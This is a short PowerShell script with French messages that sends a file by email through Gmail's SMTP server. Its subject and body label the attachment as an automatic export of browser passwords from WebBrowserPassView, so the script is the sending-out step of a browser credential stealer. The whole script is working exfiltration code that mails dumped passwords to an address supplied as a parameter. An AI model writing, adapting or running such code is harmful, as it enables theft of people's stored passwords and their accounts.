param(
    [string]$FilePath,
    [string]$EmailTo
)

$SMTPServer = "smtp.gmail.com"
$SMTPPort = 587
$Username = "REMOVED_SMTP_EMAIL"
$Password = "REMOVED_SMTP_PASS"
$EmailFrom = $Username
$Subject = "Export WebBrowserPassView - " + (Get-Date -Format "dd/MM/yyyy HH:mm")
$Body = "Export automatique des mots de passe du navigateur."

try {
    $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
    $Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword)
    
    $MailMessage = @{
        From = $EmailFrom
        To = $EmailTo
        Subject = $Subject
        Body = $Body
        SmtpServer = $SMTPServer
        Port = $SMTPPort
        UseSsl = $true
        Credential = $Credential
        Attachments = $FilePath
    }
    
    Send-MailMessage @MailMessage
    Write-Host "Email envoye avec succes!" -ForegroundColor Green
} catch {
    Write-Host "Erreur lors de l'envoi: $($_.Exception.Message)" -ForegroundColor Red
}